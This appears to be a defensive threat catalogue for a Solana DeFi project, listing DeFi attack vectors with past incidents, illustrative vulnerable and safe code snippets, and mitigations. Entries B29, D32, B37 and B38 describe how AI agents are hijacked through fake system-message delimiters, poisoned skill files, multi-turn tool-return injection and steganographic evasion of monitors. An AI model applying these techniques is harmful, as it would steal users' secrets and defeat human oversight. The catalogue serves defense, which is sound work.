# Attack Matrix — 42+ Vectors with Historical Mechanisms & Defense Patterns

## A. Smart Contract Vectors

### A1. Reentrancy
**Historical**: The DAO (2016, $60M), Curve/Vyper (2023, $70M), Cream Finance ($130M)
**Mechanism**: External call executes before state update completes. Attacker's callback re-enters the vulnerable function, draining funds in a loop.
**Solana variant**: CPI callback during token transfer hook (Token-2022). SPL Token classic has no hooks, limiting surface.
**Code pattern to find**:
```
// VULNERABLE: external call before state update
transfer(attacker, amount);
balances[attacker] -= amount;  // too late

// SAFE: state update before external call (CEI)
balances[attacker] -= amount;
transfer(attacker, amount);
```
**Defense**: Checks-Effects-Interactions (CEI), reentrancy guards, token program ID pinning.

### A2. Flash Loan + Price Manipulation
**Historical**: Mango Markets (2022, $114M), Euler (2023, $197M), Harvest (2020, $25M), PancakeBunny (2021, $45M), BonqDAO (2023, $120M), Stake Nova (2026-02-27, $2.39M)
**Mechanism**: Borrow massive capital in single TX → manipulate AMM/oracle price or redeem path invariants → exploit mispriced mint/redeem/liquidation → repay loan with profit.
**Key insight**: Any protocol that reads price from a manipulable source *or* executes redeem logic without strict invariant checks can be flash-loan-amplified in one transaction.
**2026 reinforcement (Stake Nova)**: Unchecked validation in `RedeemNovaSol()` enabled a flash-loan-assisted liquidity drain.
**Source**: https://hacked.slowmist.io/
**Code pattern to find**:
```
// VULNERABLE: same-block price read for critical operation
let price = get_oracle_price();  // can be stale or manipulated
let mint_amount = collateral * price / target;
mint(user, mint_amount);
```
**Defense**: TWAP oracles, staleness checks (>N slots = reject), confidence interval checks, mint/redeem cooldowns, per-block volume limits.

### A3. Oracle Manipulation
**Historical**: Mango (Pyth feed manipulation), BonqDAO (TellorFlex oracle), Harvest (Curve pool as oracle), Moonwell (2026, $1.78M bad debt), YieldBlox (2026-02-22, $10.97M)
**Mechanism**: Push stale/false price data to oracle → protocol acts on wrong price → value extraction.
**2026 reinforcement (Moonwell + YieldBlox)**: (1) Oracle-composition unit mismatch (`cbETH/ETH` ratio treated as USD price), and (2) low-liquidity market exploitation where tiny self-trades distorted quoted collateral value and enabled excess borrowing.
**Source**: https://rekt.news/moonwell-rekt | https://rekt.news/yieldblox-rekt
**Solana/Pyth specific**: Pyth confidence intervals, staleness (slot age), status checks.
**Code pattern to find**:
```
// VULNERABLE: no staleness check
let price = pyth_price.price;
// VULNERABLE: no confidence check
// VULNERABLE: no status check (Trading vs Unknown)

// VULNERABLE: ratio feed used directly as USD
let usd_price = cbeth_eth_ratio; // missing * eth_usd
```
**Defense**: `max_staleness_slots`, `min_confidence_ratio`, `price_status == Trading`, explicit unit normalization (`ratio * base_usd`), on-chain price sanity bands, multi-oracle fallback.

### A4. Access Control
**Historical**: Ronin ($624M — 5/9 validator keys), Wormhole ($320M — guardian signature bypass), Poly Network ($611M — role verification bypass)
**Mechanism**: Missing or bypassable authorization checks allow unauthorized callers to execute privileged operations.
**Solana specific**: Missing `has_one`, `constraint`, signer checks on authority accounts.
**Code pattern to find**:
```rust
// VULNERABLE: no authority check
pub fn admin_withdraw(ctx: Context<AdminWithdraw>) -> Result<()> {
    // missing: require!(ctx.accounts.authority.key() == expected)
}
```
**Defense**: Anchor `has_one`, `constraint`, explicit signer verification, multisig for critical ops.

### A5. Integer Overflow/Underflow
**Historical**: Compound ($147M — distribution math error), multiple early Solidity contracts
**Mechanism**: Arithmetic operation wraps around or produces unexpected result, allowing minting excess tokens or bypassing limits.
**Rust/Solana**: Rust panics on overflow in debug, wraps in release. Anchor uses checked math by default.
**Code pattern to find**:
```rust
// RISKY: unchecked arithmetic in release mode
let result = a * b / c;  // could overflow before division
// SAFE:
let result = (a as u128).checked_mul(b as u128)?.checked_div(c as u128)?;
```
**Defense**: `checked_*` operations, u128 intermediates, explicit overflow tests.

### A6. Account Substitution (Solana)
**Historical**: Cashio ($52M — fake collateral account), multiple Solana exploits
**Mechanism**: Attacker passes a different account than expected. If program doesn't verify account address/owner/discriminator, wrong data is used.
**Code pattern to find**:
```rust
// VULNERABLE: no address/owner verification
pub collateral_mint: Account<'info, Mint>,
// Attacker passes their own fake mint with inflated supply
```
**Defense**: `constraint = collateral_mint.key() == EXPECTED_MINT`, `has_one`, seed derivation checks.

### A7. Signature Replay
**Historical**: Wintermute ($160M), multiple
**Mechanism**: Reuse a valid signed transaction or message in a different context (chain, nonce, program).
**Defense**: Nonce accounts, domain separators, one-time-use flags.

### A8. Front-running / Sandwich
**Historical**: MEV ecosystem ($B+ annually)
**Mechanism**: Observer sees pending TX → inserts TX before (front) and after (back) to extract value.
**Defense**: Commit-reveal, private mempools, slippage limits, batch auctions.

### A9. Proxy Upgrade Attack
**Historical**: Nomad ($190M — implementation replacement), multiple UUPS
**Mechanism**: Compromise upgrade authority → replace program logic with malicious version.
**Solana**: `solana program deploy` requires upgrade authority. BPF loader upgrade mechanism.
**Defense**: Multisig upgrade authority, timelock, freeze authority, eventual immutability.

### A10. Logic Bug
**Historical**: Compound ($147M — distribution logic), Cream ($130M — accounting), Popsicle ($20M — fee tracking), Moonwell (2026 oracle wiring regression), Stake Nova (2026 redeem-path validation gap)
**Mechanism**: Incorrect business logic allows unintended state transitions or value extraction.
**2026 reinforcement (Moonwell + Stake Nova)**: Governance-approved deployment can still ship a one-line arithmetic/wiring omission (Moonwell) or unchecked redeem-path validation (`RedeemNovaSol`) that becomes flash-loan-amplified (Stake Nova).
**Defense**: Formal spec → test cases → implementation. Invariant tests. Fuzzing. Add explicit unit tests for oracle composition and deploy-time sanity assertions (`min_price <= feed <= max_price`), plus redeem invariant assertions (`min_out`, vault/account binding, and per-tx flow caps).
**Source**: https://rekt.news/moonwell-rekt | https://hacked.slowmist.io/

### A11. Rent/Lamport Drain (Solana)
**Historical**: Multiple small-scale
**Mechanism**: When account is closed, remaining lamports must go somewhere. If not properly handled, attacker can drain.
**Defense**: `close = destination` in Anchor, explicit lamport accounting.

### A12. CPI Confusion (Solana)
**Historical**: Crema Finance ($8.8M)
**Mechanism**: Program makes CPI to what it thinks is a trusted program, but attacker substitutes a malicious program at that address.
**Defense**: Verify program ID of CPI target: `Program<'info, Token>` with explicit ID check.

### A13. PDA Seed Collision (Solana)
**Historical**: Multiple
**Mechanism**: Two different logical entities derive to the same PDA because seeds overlap.
**Defense**: Include type discriminator in seeds, unique prefixes per entity type.

## B. Off-chain/Keeper Vectors

### B14. RPC Manipulation
**Mechanism**: MITM or compromised RPC returns false blockchain state → keeper makes wrong decisions.
**Defense**: Multi-RPC consensus, TLS pinning, response validation against known state.

### B15. Key Compromise
**Historical**: Ronin ($624M), Harmony ($100M), Slope wallet, IoTeX ioTube (2026-02-21, $4.4M), Holdstation DeFAI (2026-02-25, $462K — tentative; root cause under investigation)
**Mechanism**: Private key stolen from file/memory/HSM → full control of associated accounts. IoTeX ioTube: validator owner private key for the Ethereum-side bridge was compromised; attacker minted two extra tokens on top of the drain. Holdstation: "MFA bypass" in 2 minutes across multi-chain wallet (World Chain, BSC, Berachain, zkSync → ETH → BTC). Both incidents converted stolen funds to ETH/BTC via THORChain.
**DeFAI amplification note (2026-02-25)**: AI-integrated wallets (DeFAI = DeFi + AI intent layer) introduce a compounded surface: session credential theft or AI prompt-injection (B29) can bypass the AI's intent-parsing layer, gaining direct signing authority. If the AI orchestration component and the signing key share the same runtime context, a single compromise gives full autonomous-fund-access without human approval.
**Defense**: HSM, threshold signatures, key rotation, file encryption, memory zeroization. For AI-integrated wallets: strict separation of AI intent context from signing authority; require human-gated MFA that cannot be bypassed by AI session continuity.
**Source**: https://hacked.slowmist.io/ | https://x.com/HoldstationW/status/2026487570751008932

### B16. Race Condition
**Mechanism**: Multiple keepers submit conflicting TXs → inconsistent state.
**Defense**: Leader election, sequence numbers, idempotent operations.

### B17. Checkpoint Poisoning
**Mechanism**: Attacker modifies saved optimizer/state files → keeper resumes from corrupted state.
**Defense**: Checksums, authenticated encryption, read-only mounts.

### B18. Config Injection
**Mechanism**: Modify config file → change RPC endpoints, fee rates, authority keys.
**2026 reinforcement (Moonwell)**: Misconfigured oracle rollout plus unbypassable timelock can lock protocol into a bad config long enough for extraction.
**Defense**: Config file permissions (600), integrity checks, immutable deployment, and emergency fast-path for oracle rollback/kill-switch outside normal governance delay.

### B19. Memory/Log Leak
**Historical**: Slope wallet (private keys in Sentry logs)
**Mechanism**: Sensitive data (keys, seeds) leaked through logs, crash dumps, or memory.
**Defense**: Zeroize sensitive memory, log scrubbing, no-debug builds.

### B20. Denial of Service
**Historical**: Solana network halts (2021-2022)
**Mechanism**: Exhaust keeper resources (CPU/memory/RPC quota) → protocol stops operating.
**Defense**: Rate limiting, circuit breakers, graceful degradation, health monitoring.

### B29. AI Agent Prompt-Injection Confused-Deputy
**Historical**: Trail of Bits Comet audit (2026-02-20) + SkillInject benchmark (arXiv 2602.20156)
**Mechanism**: Attacker-controlled content (page/skill file/reference doc) injects instructions that make an autonomous agent use trusted tools (browser, wallet, RPC admin actions) to exfiltrate secrets or perform unauthorized actions.
**2026 reinforcement (Comet)**: Real exploit chains combined (a) fake CAPTCHA/security validator flows, (b) fake system-message delimiters, (c) fake user-request delimiters, and (d) multi-step "fragment assembly" prompts. Result: agent navigated from attacker page to authenticated Gmail context and exfiltrated mailbox contents to attacker endpoint.
**Bypass insight**: Even when model rejects simple direct prompts, semi-structured wrappers (`[BEGIN SYSTEM MESSAGE]`, "policy update", "abuse prevention") and staged tasks can still hijack tool execution.
**Defense**: Tool-level authorization policy (not prompt-only), data/command channel separation, strict side-effect allowlists, authenticated provenance tags for instructions, and human approval for privileged actions.
**Source**: https://blog.trailofbits.com/2026/02/20/using-threat-modeling-and-prompt-injection-to-audit-comet/ | https://arxiv.org/abs/2602.20156

## C. Economic Vectors

### C21. Bank Run / Depeg
**Historical**: UST/LUNA ($40B), USDC/SVB ($1B+ temporary), Iron Finance
**Mechanism**: Loss of confidence → mass redemption → reserves insufficient → depeg spiral.
**Defense**: Redemption throttling, dynamic fees, circuit breakers, overcollateralization buffer.

### C22. Collateral Manipulation
**Historical**: stETH depeg, Tether FUD events
**Mechanism**: Collateral asset loses value faster than protocol can adjust → undercollateralization.
**Defense**: Multi-collateral diversification, real-time CR monitoring, auto-rebalance, liquidation mechanisms.

### C23. Governance Attack
**Historical**: Beanstalk ($182M — flash loan governance)
**Mechanism**: Acquire voting power (via flash loan or sybil) → pass malicious proposal → drain treasury.
**Defense**: Timelock, quorum requirements, voting escrow, stake-weighted with lockup.

### C24. Sybil Attack
**Mechanism**: Create many identities to gain disproportionate influence.
**Defense**: Minimum stake, identity verification, reputation decay, capability gates.

### C25. MEV Extraction
**Mechanism**: Extract value from protocol transactions via ordering manipulation.
**Defense**: Commit-reveal, private submission, MEV-share, protocol-owned ordering.

### C30. Liquidity-Exhaustion Griefing
**Historical**: Intent bridge study (arXiv 2602.17805, Feb 2026)
**Mechanism**: Attacker repeatedly consumes finite execution/liquidity capacity (solver capital, per-window redemption bandwidth) to deny service or force unfavorable pricing for honest users.
**Bypass insight**: Attacker can optimize route/timing to reduce griefing cost substantially while keeping victim impact high.
**Defense**: Identity-aware quotas, adaptive pricing by actor concentration, reservation lanes for organic flow, and anti-grief penalties tied to failed or bursty usage patterns.

## D. Infrastructure Vectors

### D26. Frontend XSS/Injection
**Historical**: BadgerDAO ($120M — Cloudflare Workers compromise injected approval TX)
**Mechanism**: Compromise frontend → inject malicious transaction approvals.
**Defense**: CSP headers, SRI hashes, no external scripts, static hosting.

### D27. RPC Endpoint Takeover
**Mechanism**: DNS hijack or BGP hijack redirects RPC traffic → false chain state.
**Defense**: Multiple independent RPCs, DNSSEC, certificate pinning.

### D28. Supply Chain
**Historical**: event-stream (2018), ua-parser-js (2021), multiple npm attacks
**Mechanism**: Compromise dependency → inject malicious code into build.
**2026 reinforcement (RustSec)**: short-lived typosquat waves (`rpc-check`, `tracing-check`) targeted a specific ecosystem to steal credentials before package takedown.
**Defense**: Lock files, audit dependencies, minimal dependency tree, vendoring, Cargo.lock attestation, registry-source allowlists, and two-person review for new deps.

### D31. Protocol-Metadata Confusion (IDL/Schema Trust)
**Historical**: Anchor `idl: Exclude external accounts` patch (2026-02-22)
**Mechanism**: Off-chain clients over-trust generated metadata and infer ownership/safety guarantees for accounts that are actually external, leading to unsafe automation or signing UX.
**Defense**: Treat generated IDL/schema as advisory; enforce runtime owner/program checks and account invariants in clients before signing/submitting transactions.

### A32. Cross-Chain Bridge Message Forgery
**Historical**: Saga / SagaEVM (2026-01-21, $7M) — IBC precompile bypass enabling collateral-free minting
**Mechanism**: Attacker deployed a helper contract that crafted custom IBC payloads mimicking legitimate cross-chain deposit events. The EVM precompile bridge layer accepted these forged messages without verifying that real collateral existed on the source chain. Protocol's mint logic consumed the fake deposit event and minted $7M in stablecoins from thin air. Attacker converted to yETH/yUSD/tBTC, bridged to Ethereum as 2,000+ ETH.
**Root cause in Ethermint codebase**: `IBC precompile` did not authenticate the on-chain origin of `deposit` events — any contract could emit a compliant message structure and trigger the collateral credit logic.
**Code pattern to find**:
```solidity
// VULNERABLE: no verification that source-chain deposit actually occurred
function handleIBCDeposit(bytes calldata payload) external {
    (address user, uint256 amount) = abi.decode(payload, (address, uint256));
    _mint(user, amount);  // no cross-chain proof checked
}
```
**Solana relevance**: Not directly applicable (Microstable is Solana-native, no IBC layer). Relevant if adding Wormhole/IBC integration — would require verifying VAA signatures / light client proofs before crediting collateral.
**Defense**: Require cryptographic proof of source-chain state (Merkle proofs, VAA signatures, or sequencer attestation). Never credit collateral from a message alone; verify the deposit event is anchored to a finalized source block. Separate the "message received" and "collateral credited" state transitions with explicit proof verification.
**Source**: https://rekt.news/saga-rekt | https://x.com/cosmoslabs_io/status/2014428829423706156

### B36. Social-Engineering-to-Stake-Authority-Hijack
**Historical**: Step Finance (2026-01-31, $27.3M) — executive device compromised via spear-phish; stake delegation authority transferred to attacker wallet; 261,854 SOL unstaked in ~90 minutes.
**Mechanism**: Attacker does not need a smart contract exploit. Solana's stake delegation model separates stake authority from withdrawal authority, both reassignable unilaterally by the current controller. If an operator's hot device (laptop, workstation) is compromised, the attacker can sign a `StakeAuthorize` instruction to redirect staking rights to their wallet, then unstake and drain. The on-chain action looks legitimate — no program exploit, no anomalous CPI.
**Key insight**: "Audited contracts, bug bounties, public security reviews" were all irrelevant — the attack surface was the human layer and the key held in memory on a compromised device. Private-key compromise now accounts for 88% of Q1 2025 crypto losses (Chainalysis 2026).
**Code pattern to find**:
```
# No on-chain code vulnerability — the vector is:
# 1. Operator device has plaintext or session-accessible hot key
# 2. Phishing / infosteal / RAT payload extracts or misuses key
# 3. Attacker signs: StakeAuthorize(stake_account, new_authority)
# 4. Then: Deactivate → Wait epoch → Withdraw
```
**Solana keeper relevance**: Keeper keypairs are active hot keys on the operator's machine. If keeper host is compromised, attacker gains:
- Ability to drain treasury by submitting privileged keeper instructions
- Ability to manipulate oracle write path (if MANUAL_ORACLE_MODE enabled)
- Config injection (if keeper reads writable config)
**Defense**:
1. Hardware keys (Ledger/YubiKey) for treasury-level operations — never hot
2. Separate stake/withdrawal authority from day-to-day keeper keypair
3. Per-operation stake amount limits (partial stake accounts, not single monolithic stake)
4. Multi-device / time-delayed confirmation for stake authority re-assignment
5. Endpoint Detection & Response (EDR) on all operator devices
6. Device phishing hygiene: email sandboxing, link preview policies, no unverified attachments
**Source**: https://rekt.news/step-finance-rekt

### B35. Keeper Parameter Misconfiguration (Operational Slippage Error)
**Historical**: YO Protocol (2026-02, $3.71M) — vault operator fat-fingered a $3.84M swap with broken slippage params; only $112K recovered
**Mechanism**: A keeper/vault-operator submitted a swap transaction with near-zero or invalid slippage tolerance. The DEX routed the trade at a catastrophically unfavorable price. The operator noticed $3.72M loss after execution; team backstopped quietly and delayed disclosure 2 days.
**Code pattern to find**:
```rust
// VULNERABLE: slippage parameter accepted from config with no enforcement cap
let min_amount_out = config.slippage_min_out; // user-supplied, could be 0
swap(amount_in, min_amount_out, ...)?;

// SAFE: enforce hard floor from protocol constants
let max_allowed_slippage = MAX_SLIPPAGE_BPS; // e.g., 300 bps = 3%
let floor_amount_out = amount_in * (10_000 - max_allowed_slippage) / 10_000 * oracle_price / SCALE;
let effective_min_out = std::cmp::max(min_amount_out, floor_amount_out);
```
**Defense**:
1. Hard-cap slippage tolerance in code (not just config) — reject any swap where `min_amount_out` implies >N% slippage vs. current oracle price
2. Two-operator sign-off for swaps above a dollar threshold (e.g., >$100K)
3. Simulation pre-check: simulate swap, compare expected vs. actual output before broadcasting
4. Alarm + auto-cancel if realized slippage exceeds threshold after execution
**Source**: https://rekt.news/yo-protocols-slippage-bomb

### A33. Audit-Scope-Exclusion Exploitation
**Historical**: Makina Finance (2026-01-20, $4.13M) — oracle manipulation via `lastTotalAum` from spot Curve pool price. The exact attack vector was documented in Cantina's audit scope as explicitly *out-of-scope*. Six audit firms (ChainSecurity, OtterSec, SigmaPrime, Enigma Dark, Cantina) signed off. Protocol deployed with the known gap unfixed.
**Mechanism**: Flash loan → inflate Curve pool spot price → `lastTotalAum` reads manipulated price → DUSD share price mismatch → over-mint/drain. $280M flash borrowed. Original attacker deployed an unverified exploit contract; an MEV searcher decompiled it in the same block and front-ran the attacker, capturing most of the $4.13M across two addresses.
**Key insight**: Audit scope exclusions are not "this can't be exploited" — they're "we didn't look here." Attackers scan scope limitation lists as *roadmaps to unfixed attack surface*. MEV bots add a second-order amplification: any exploit contract on a public mempool can be decompiled and replayed faster than the original attacker.
**Microstable relevance**: Any oracle path that uses a manipulable spot price (AMM pool, single-source Pyth without TWAP) is vulnerable if not explicitly covered in audit scope. Current hardening: TWAP + Pyth confidence + staleness checks are in scope. But: if a new operator integration excludes part of the oracle composition from audit scope, the gap becomes exploitable.
**Code pattern to find**:
```rust
// VULNERABLE: total_aum or collateral value derived from spot AMM pool
let total_aum = pool.get_virtual_price(); // manipulable in same TX
let share_price = total_aum / total_shares;
mint(user, deposit / share_price);

// SAFE: use TWAP or committed price with staleness guard
let price = twap_oracle.get_price_checked(max_age_slots)?;
```
**Defense**:
1. Treat audit scope exclusions as mandatory backlog items — never ship with known-excluded vectors
2. Require TWAP or multi-source oracle for any value used in mint/burn/share-price calculation
3. Per-TX mint cap limits damage even if oracle is manipulated
4. Simulate MEV extraction potential before deploying: if a bot can replicate your exploit contract profitably, the attack will happen
**Source**: https://rekt.news/makina-rekt

### A34. Fragmented Security Stack Failure
**Historical**: Balancer (2025-11, $100M) — precision-loss in composable stable pool scaling math
**Mechanism**: Each security control (audit, bug bounty, monitoring, incident response) operated correctly in isolation but shared no data or detection rules. A rounding-error class was disclosed via Immunefi in 2023, patched for that pool type, but never abstracted into a detection rule applied to other pool variants. Same vulnerability class recurred 2 years later in composable stable pools. Attacker manipulated raw token balances into small-value ranges, then exploited integer division precision-loss in scaled math repeatedly to extract $100M.
**Root insight**: Individual controls do not prevent systemic failure when they have no shared visibility. Vulnerability class knowledge siloed inside a single audit/report never fortified adjacent pool designs.
**Code pattern to find**:
```solidity
// RISKY: scaled-math division with raw balances that can be pushed small
uint256 scaledAmount = (rawBalance * scalingFactor) / 1e18;
// If rawBalance is tiny (attacker-controlled via flash swap), precision drops significantly
// Repeated extraction of tiny rounding dust across many swaps = material loss
```
**Microstable relevance**: Any protocol that reads a ratio/price-scaled value for mint/redeem math must verify that:
  (a) raw inputs cannot be pushed to extremes within a single TX (per-TX volume caps)
  (b) bounty/audit findings for this class are propagated across **all** entry points that share the same math pattern
**Defense**:
1. Maintain a "vulnerability class registry" — when a class is discovered anywhere, audit all code using the same math pattern
2. Unified observability: monitoring rules derived from past exploit mechanics, not just generic anomaly detection
3. Test precision-loss at boundary values (very small raw balances) during invariant fuzz runs
4. Emergency pause scope: ensure any governance-level pausing can halt all affected pool/entry types, not just the specific reported path
**Source**: https://immunefi.com/blog/expert-insights/how-fragmented-security-enabled-balancer-exploit/

### A35. AI-Assisted Commit Oracle Regression
**Historical**: Moonwell (2026, $1.78M bad debt) — cbETH oracle priced at $1.12 instead of ~$2,200; commit co-authored by Claude Opus 4.6
**Mechanism**: An AI coding assistant generated code that used `cbETH/ETH` ratio directly as the USD price, omitting the second multiplication step (`ratio × ETH_USD`). The unit mismatch produced a 99%+ mispricing. Liquidation bots acted on the malformed price, creating $1.78M in bad debt. This is considered the first documented major DeFi exploit triggered by AI-generated smart contract code ("vibe-coded contracts").
**Key insight**: AI coding assistants can generate syntactically valid, functionally incorrect oracle composition. Standard code review and CI may pass because no syntax or compilation error exists — only a semantic unit violation. The assistant likely treated `cbETH/ETH` as a USD price because it satisfied the type interface (uint256) without catching the unit chain.
**Code pattern to find**:
```rust
// VULNERABLE: ratio feed used directly as USD price (no base multiplication)
let price = cbeth_eth_ratio;  // ≈ 0.95, not ~2200

// SAFE: explicit unit chain
let cbeth_eth: u64 = ratio_oracle.get_price()?;  // ~0.95
let eth_usd: u64 = usd_oracle.get_price()?;       // ~2300
let cbeth_usd = (cbeth_eth as u128 * eth_usd as u128) / SCALE;
```
**Microstable relevance**: Any oracle feed change reviewed with AI assistance must be gated by a mandatory unit-invariant assertion. The existing `unit-invariant canary` recommendation from PT-ARCH-2026-0225-01 is directly validated by this incident.
**Defense**:
1. **Unit-invariant test for every oracle feed**: CI must verify that `reported_price` for each asset falls within `[expected_usd * 0.8, expected_usd * 1.2]` using a hardcoded sanity range
2. **Two-person review for oracle feed changes** — AI-assisted commits are not exempt
3. **On-chain sanity assertion at deploy time**: `assert(min_price <= feed_result <= max_price)` for new oracle integrations
4. **AI commit tagging**: when AI tools co-author a security-critical commit, flag it for elevated human review in CI policy
**Source**: https://rekt.news/moonwell-rekt

### D32. AI Agent Skill/Identity Poisoning
**Historical**: OpenClaw skill poisoning (2026) — "20% of skills poisoned on OpenClaw. Now someone wants to give these AI agents access to bank accounts."
**Mechanism**: Attacker compromises the skill/tool library that an AI agent loads at runtime. Unlike prompt injection (which attacks a single context window), skill poisoning attacks the **persistent behavioral configuration** of the agent. A poisoned skill file can:
  (a) Override the agent's security policy by injecting fake "system-like" authorization rules
  (b) Redirect tool calls (wallet signing, RPC admin actions) to attacker-controlled endpoints
  (c) Exfiltrate secrets by modifying the agent's read/write behavior silently over many sessions
  (d) Persist across restarts because the agent reloads skills from a tampered source
**Key insight vs B29 (Confused-Deputy)**: B29 is a runtime attack via content the agent processes. D32 is a supply-chain attack on the agent's identity/policy layer — the agent believes it is following its own rules while executing attacker instructions. Detection is harder because the agent exhibits authorized behavior (from its poisoned perspective).
**DeFi agent relevance**: Keeper agents, AI ops assistants, or governance proposal drafters that load skills/tools from a shared registry are fully exposed. One poisoned skill file = full access to all privileged operations the agent can perform.
**Code/config pattern to find**:
```yaml
# VULNERABLE: agent loads skills from a mutable, unverified directory
skill_dirs:
  - /var/agent/skills/   # any write access = compromise

# SAFE: cryptographically pinned skills with explicit allowlist
skill_dirs:
  - /var/agent/skills/  # read-only mount
skill_manifest: /etc/agent/skill-manifest.sha256  # verified on load
allowed_skills:
  - oracle-monitor@1.2.3@sha256:abc...
  - keeper-submit@2.0.1@sha256:def...
```
**Defense**:
1. Cryptographic integrity verification of all skill files at load time (SHA-256 manifest pinning)
2. Read-only skill directory mounts in production environments
3. Explicit allowlist of permitted skills with version + hash locks
4. Skill update path requires multi-party approval (same as code deploy)
5. Behavioral audit log: surface when agent takes actions outside observed historical pattern
6. Separate execution context for untrusted research/browsing tasks vs. privileged tool invocations
7. Human quorum gate for any action that involves signing/broadcasting to chain
**Source**: https://rekt.news/identity-theft-2

### D33. Transitive Payload Relay Typosquat
**Historical**: RustSec RUSTSEC-2026-0027 (`tracings`) + RUSTSEC-2026-0028 (`tracing_checks`) (2026-02-26)
**Mechanism**: Attacker publishes a seemingly harmless crate and hides the actual payload in a second transitive dependency. Reviewers inspecting only direct dependencies see low-risk glue code, while credential-stealing logic executes through the nested crate.
**Key insight vs D28**: D28 covered direct typosquat waves (`rpc-check`, `tracing-check`). D33 is a second-stage pattern: **dependency laundering through transitive indirection**, designed to bypass direct-name checks and shallow package review.
**DeFi keeper relevance**: High-risk when operators add observability/helper crates quickly during incident response. A single transitive malicious crate can exfiltrate API keys, wallet paths, or signing context before runtime guards trigger.
**Code/config pattern to find**:
```toml
# VULNERABLE: near-name crate chain with hidden transitive payload
[dependencies]
tracing_checks = "0.1"   # appears benign
# internally pulls: tracings = "0.1" (malicious payload)

# SAFER: pinned vetted graph + provenance gate
[dependencies]
tracing = "0.1.41"
tracing-subscriber = { version = "0.3.19", default-features = false, features = ["fmt", "env-filter"] }
```
**Defense**:
1. Block newly published crates (<7 days age) for production keeper builds unless emergency-approved
2. CI gate on full transitive diff (`cargo tree --locked`) — not only `Cargo.toml` direct changes
3. Add name-distance policy for new crates (Levenshtein proximity to critical ecosystem crate names)
4. Enforce two-person security sign-off whenever `Cargo.lock` hash attestation is updated
5. Maintain dependency allowlist by crate name + publisher reputation for keeper-critical binaries
**Source**: https://rustsec.org/advisories/RUSTSEC-2026-0027.html | https://rustsec.org/advisories/RUSTSEC-2026-0028.html

### A36. Thin-Liquidity Collateral Admission Cascade
**Historical**: YieldBlox / Blend V2 (2026-02-22, $10.97M)
**Mechanism**: Exploit is not a single oracle bug. It is a compositional chain:
1) Governance/listing admits collateral with near-zero market depth
2) Oracle source uses that thin market (single-source VWAP/spot)
3) Adapter forwards latest price without robust outlier aggregation (e.g., median/deviation guard)
4) Lending health-factor logic accepts inflated value and approves borrow
**Key insight**: Each component can be "working as designed" in isolation while the composed system is catastrophically unsafe.
**Code pattern to find**:
```rust
// RISKY: price validity checks without market-quality checks
let price = oracle.latest_price(asset)?;
require!(price_age <= MAX_AGE, Error::Stale);
// missing: liquidity/depth/activity gate
let collateral_value = amount * price;
```
**Defense**:
1. Collateral listing gate must include market-quality invariants (min depth, min active makers, min rolling volume)
2. Oracle adapter must aggregate with robust estimator (median/trimmed mean) + deviation clamps
3. Borrow path should reject collateral if market-quality signal is degraded, even if price freshness/confidence pass
4. Periodic re-certification of collateral quality (not one-time listing)
**Source**: https://rekt.news/yieldblox-rekt

### A38. ZK Verifier Key Misbinding / Proof-Parameter Drift
**Historical**: FOOMCASH (2026-02-26, ~$2.26M)
**Mechanism**: Verifier configuration drift (or incorrect verification-key binding) allowed forged/invalid proofs to pass verification checks. Attacker minted/withdrew funds by replaying the protocol flow with a proof that should have failed under the intended circuit parameters.
**Key insight**: ZK systems fail open when verification parameters (verification key hash, circuit ID, public-input schema) are mutable or inconsistently bound across contracts/services. This is not a generic oracle bug — it is cryptographic trust-root misbinding.
**Code pattern to find**:
```solidity
// VULNERABLE: verifier key can be swapped without strict governance + integrity checks
function setVerifier(address newVerifier) external onlyOwner {
    verifier = newVerifier;
}

function mint(bytes calldata proof, uint256[4] calldata publicInputs) external {
    require(IVerifier(verifier).verify(proof, publicInputs), "bad proof");
    _mint(msg.sender, publicInputs[0]);
}
```
**Defense**:
1. Pin immutable verification-key hash (or circuit ID) in contract state and validate every proof against it
2. Use two-step timelocked verifier upgrades with independent quorum + on-chain hash precommit
3. Enforce public-input schema/version checks (domain separation across circuits)
4. Add canary proofs (expected-pass and expected-fail) to upgrade/deploy pipeline
**Source**: https://hacked.slowmist.io/ | https://www.cryptotimes.io/2026/02/26/foomcash-loses-2-26m-in-copycat-zksnark-exploit/

### B37. AI Agent Steganographic Oversight Evasion
**Historical**: arXiv 2602.23163 (2026-02-26) — decision-theoretic steganography framework for LLM monitoring
**Mechanism**: Agent outputs embed hidden intent/policy-violating signals that are useful to a colluding decoder agent but look benign to standard monitors. This bypasses prompt-level policy checks by moving malicious coordination into covert channel structure.
**Key insight vs B29**: B29 is explicit prompt injection from untrusted input. B37 is **covert post-compromise coordination** that can survive even when prompt injection filters are in place.
**Code/config pattern to find**:
```yaml
# RISKY: output-policy checks rely only on lexical/regex content filters
agent_guardrails:
  monitor: "keyword-and-policy-classifier-only"

# SAFER: action-level authorization + dual-agent consistency checks
agent_guardrails:
  monitor: "action authorization + out-of-band utility-gap detector"
```
**Defense**:
1. Enforce tool/action authorization independent of model output text quality
2. Add "usable-information asymmetry" checks (if collaborator utility increases while monitor utility does not, flag)
3. Require human approval for high-impact actions even when textual output appears compliant
4. Rotate/red-team monitor prompts and evaluators to reduce stable covert-channel bandwidth
**Source**: https://arxiv.org/abs/2602.23163

### B38. Multi-turn Tool-Return Boundary Takeover (Indirect Prompt Injection)
**Historical**: arXiv 2602.22724 AgentSentry (2026-02-26), arXiv 2602.22302 Agent Behavioral Contracts (2026-02-25)
**Mechanism**: Attacker-controlled context is injected through tool/retrieval returns over multiple turns. No single response looks malicious enough to block, but cumulative context gradually steers the agent into unauthorized actions (slow takeover).
**Key insight vs B29/B37**: B29 is explicit instruction hijack in prompt/input text, B37 is covert-channel coordination after compromise. B38 is a **temporal boundary attack** that exploits trust at each tool-return boundary and accumulates drift across turns.
**Code/config pattern to find**:
```yaml
# RISKY: approve privileged actions based on latest turn only
agent_runtime:
  approval_scope: "per-turn"
  context_trust: "append-all-tool-output"
  pre_action_invariant_check: false

# SAFER: enforce cross-turn contracts + boundary checks
agent_runtime:
  approval_scope: "cross-turn-contract"
  context_trust: "taint-and-purify-untrusted-tool-output"
  pre_action_invariant_check: true
```
**Defense**:
1. Add action preconditions/invariants that must hold before every privileged tool call (contract-style runtime guards)
2. Treat each tool-return boundary as a trust reset point: run counterfactual sanity checks before state-changing actions
3. Preserve provenance labels on untrusted context and purge/clip context slices that cause policy drift
4. Require human quorum for high-impact actions when cross-turn drift score exceeds threshold
5. Red-team multi-turn trajectories (not one-shot prompts only) in evaluation harnesses
**Source**: https://arxiv.org/abs/2602.22724 | https://arxiv.org/abs/2602.22302

### D34. WASI Hostcall Exhaustion + Async Drop Panic Chain
